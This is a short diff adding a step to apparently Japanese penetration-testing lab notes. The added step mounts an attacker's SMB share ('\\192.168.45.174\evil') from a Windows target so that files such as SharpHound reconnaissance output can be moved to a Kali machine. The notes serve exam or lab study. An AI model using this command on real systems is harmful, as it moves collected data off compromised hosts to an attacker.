@@ -333,3 +333,8 @@ iwr -UseDefaultCredentials http://web04
 ```
 wmic os get osarchitecture
 ```
+
+4. sharphoundなどのファイルをWindowsからKaliへ転送する際に、Kali側でSMB共有をONにしてから以下のコマンドをWindows上で実行してフォルダをマウントする。X:ドライブにマウントしているので、アクセスするときはcd X:\みたいにすればアクセスできる。
+```
+net use X: \\192.168.45.174\evil
+```
